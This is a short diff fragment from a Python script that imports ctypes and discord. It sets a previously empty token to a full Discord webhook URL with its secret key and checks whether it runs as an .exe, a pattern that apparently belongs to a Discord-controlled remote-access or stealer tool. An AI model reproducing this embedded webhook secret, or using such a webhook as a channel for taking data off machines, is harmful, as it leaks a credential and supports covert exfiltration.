@@ -17,7 +17,7 @@ from ctypes import *
 import asyncio
 import discord
 from discord import utils
-token = ''
+token = 'https://discord.com/api/webhooks/1344831028488962081/CPPJ9pX-yfRqIETpUHHIESzEnwybmsIv5o-Vh9Aig1PDK8x0WOkGsJ9kpAwZz8bqvroq'
 global isexe
 isexe=False
 if (sys.argv[0].endswith("exe")):
